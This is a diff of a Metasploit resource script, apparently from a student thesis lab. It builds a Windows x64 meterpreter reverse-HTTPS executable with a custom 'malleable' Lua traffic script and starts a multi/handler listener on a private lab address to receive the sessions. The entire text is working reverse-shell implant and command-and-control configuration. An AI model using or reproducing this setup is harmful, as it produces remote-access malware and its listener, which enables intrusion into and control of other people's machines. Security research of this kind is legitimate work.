@@ -1,30 +1,42 @@
+# test timo
 setg LogLevel 3
-setg LHOST 192.168.42.131
-setg HandlerSSLCert "/home/timo/Projects/bachelor/certs/malleable_cert.pem"
 
-setg AutoLoadStdapi true
+## PAYLOAD
+use payload/windows/x64/meterpreter_reverse_https
 
-use payload/windows/x64/meterpreter_reverse_http
+set LHOST 192.168.42.201
+set LPORT 443
+#set LPORT 80
 
-setg OverrideRequestHost true
-setg OverrideScheme httpm
-setg luri mysuperduperpath
-setg httpuseragent aaa
+set OverrideRequestHost true
+set OverrideScheme httpms
+#set OverrideScheme httpm
 
-setg malleablescriptpath /home/timo/Projects/bachelor/lua-testing/unit-tests/luaunit/timoTests/scripts/meterpreter_malleable.lua
+# set HandlerSSLCert "/home/timo/Projects/bachelor/certs/malleable_cert.pem"
 
-set LPORT 80
-
-
+set malleablescriptpath /home/timo/Projects/bachelor/lua-testing/unit-tests/luaunit/timoTests/scripts/meterpreter_malleable.lua
 
 generate -f exe -o /mnt/hgfs/Shared_Folder/bachelor/meterpreter_out/meterpreter.exe
 
+## HANDLER
 use multi/handler
-set ExitOnSession false
-
 set payload windows/x64/meterpreter_reverse_http
 
-set LPORT 5555
+set LHOST 192.168.42.201
+set LPORT 443
+
+
+set reverseAllowProxy false
+set ReverseListenerBindAddress 192.168.42.201
+set ReverseListenerBindPort 5555
+
+set OverrideRequestHost true
+set OverrideScheme https
+
+# set ExitOnSession false
+
 run -j
 
 jobs -v
+# test timo
+# setg OverrideScheme httpm
